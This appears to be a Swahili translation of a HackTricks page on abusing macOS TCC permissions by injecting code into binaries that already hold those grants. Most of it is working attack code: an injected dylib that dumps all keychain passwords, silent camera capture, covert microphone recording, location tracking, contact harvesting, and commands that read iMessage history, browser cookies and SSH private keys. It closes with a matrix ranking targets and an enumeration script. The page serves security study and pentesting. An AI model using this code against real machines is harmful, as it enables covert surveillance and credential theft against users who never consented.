# macOS Kuiba Nywila na Data kupitia Vibali vya TCC

{{#include ../../../../banners/hacktricks-training.md}}

## Muhtasari

macOS TCC (Transparency, Consent, and Control) inalinda ufikiaji wa data nyeti za mtumiaji. Wakati mshambuliaji **atapodhibiti binary ambayo tayari ina vibali vya TCC**, atarithi vibali hivyo. Ukurasa huu unaeleza uwezo wa ku-exploit kila kibali cha TCC kinachohusiana na uiba wa data.

> [!WARNING]
> Code injection into a TCC-granted binary (via DYLD injection, dylib hijacking, or task port) **inarithi kimya vibali vyake vyote vya TCC**. Hakuna onyo au uthibitisho wa ziada wakati mchakato ule ule unasoma data zilizolindwa.

---

## Keychain Access Groups

### Mambo ya Thamani

Keychain ya macOS inahifadhi:
- **Nywila za Wi‑Fi** — nywila zote za mitandao ya wireless zilizohifadhiwa
- **Nywila za tovuti** — Safari, Chrome (wakati ukitumia Keychain), na nywila za vichunguzi vingine
- **Nywila za programu** — akaunti za barua pepe, kredenshiali za VPN, tokeni za maendeleo
- **Vyeti na funguo za kibinafsi** — code signing, client TLS, S/MIME encryption
- **Noti salama** — siri zilizohifadhiwa na mtumiaji

### Entitlement: `keychain-access-groups`

Vitu kwenye Keychain vimepangwa katika **makundi ya ufikiaji**. Kibali cha programu cha `keychain-access-groups` kinaorodhesha ni makundi gani inaweza kufikia:
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### Exploitation
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Keychain Theft
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## Camera Access (kTCCServiceCamera)

### Exploitation

Binary yenye ruhusa ya camera TCC (kupitia `kTCCServiceCamera` au `com.apple.security.device.camera` entitlement) inaweza kunasa picha na video:
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### Silent Capture
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> Kuanzia na **macOS Sonoma**, kiashiria cha kamera katika upau wa menyu kinabaki kuonekana na hakiwezi kufichwa kwa kutumia programu. Kwa matoleo ya zamani ya **macOS**, kunasa kwa muda mfupi kunaweza kutoonyesha kiashiria kinachoweza kutambulika.

---

## Microphone Access (kTCCServiceMicrophone)

### Exploitation

Ufikiaji wa maikrofoni unarekodi sauti zote kutoka kwenye maikrofoni iliyojengwa, headset, au vifaa vingine vilivyounganishwa vya pembejeo ya sauti:
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### Shambulio: Ambient Recording
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## Ufuatiliaji wa Mahali (kTCCServiceLocation)

### Exploitation
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### Ufuatiliaji Endelevu
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## Mawasiliano / Kalenda / Picha

### Uondoaji wa Data Binafsi

| Huduma ya TCC | Framework | Taarifa |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | Majina, anwani za barua pepe, namba za simu, anwani |
| `kTCCServiceCalendar` | `EventKit` | Mikutano, washiriki, maeneo |
| `kTCCServicePhotos` | `Photos.framework` | Picha, picha za skrini, metadata ya eneo |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### Ukusanyaji wa Mawasiliano
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## Ufikiaji wa Akaunti ya iCloud

### Ruhusa: `com.apple.private.icloud-account-access`

Ruhusa hii inaruhusu kuwasiliana na huduma ya XPC `com.apple.iCloudHelper`, ikitoa ufikiaji kwa:
- **iCloud tokens** — tokens za uthibitisho za Apple ID ya mtumiaji
- **iCloud Drive** — nyaraka zilizosawazishwa kutoka kwa vifaa vyote
- **iCloud Keychain** — nywila zilizosawazishwa kwenye vifaa vyote vya Apple
- **Find My** — eneo la vifaa vyote vya Apple vya mtumiaji
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> Kudhoofisha binary yenye idhini ya iCloud kunapanua shambulio kutoka kwa **kifaa kimoja hadi mfumo mzima wa Apple**: Macs mengine, iPhones, iPads, Apple Watch. Sawazisho la iCloud Keychain inamaanisha nywila kutoka kwa vifaa vyote zinaweza kufikiwa.

---

## Full Disk Access (kTCCServiceSystemPolicyAllFiles)

### The Most Powerful TCC Permission

Full Disk Access inatoa uwezo wa kusoma **kila faili kwenye mfumo**, ikiwa ni pamoja na:
- Data za programu nyingine (Messages, Mail, historia ya Safari)
- Hifadhidata za TCC (zinafunua ruhusa zote nyingine)
- Vifunguo vya SSH na usanidi
- Cookies za kivinjari na tokeni za kikao
- Hifadhidata za programu na kache
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## Matriki ya Kipaumbele ya Exploitation

Unapopima injectable TCC-granted binaries, panga kipaumbele kulingana na thamani ya data:

| Kipaumbele | TCC Permission | Kwa nini |
|---|---|---|
| **Muhimu** | Full Disk Access | Ufikiaji wa kila kitu |
| **Muhimu** | TCC Manager | Inaweza kutoa ruhusa yoyote |
| **Juu** | Keychain Access Groups | Nenosiri zote zilizohifadhiwa |
| **Juu** | iCloud Account Access | Kuathiri vifaa vingi |
| **Juu** | Input Monitoring (ListenEvent) | Keylogging |
| **Juu** | Accessibility | Udhibiti wa GUI, kujipa ruhusa |
| **Wastani** | Screen Capture | Kukamata data ya kuona |
| **Wastani** | Camera + Microphone | Ufuatiliaji |
| **Wastani** | Contacts + Calendar | Taarifa za social engineering |
| **Chini** | Location | Ufuatiliaji wa kimwili |
| **Chini** | Photos | Taarifa binafsi |

## Skripti ya Uorodheshaji
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## Marejeo

* [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
* [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
* [Objective-See — TCC Exploitation](https://objective-see.org/blog/blog_0x4C.html)
* [OBTS v5.0 — iCloud Token Extraction (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)

{{#include ../../../../banners/hacktricks-training.md}}
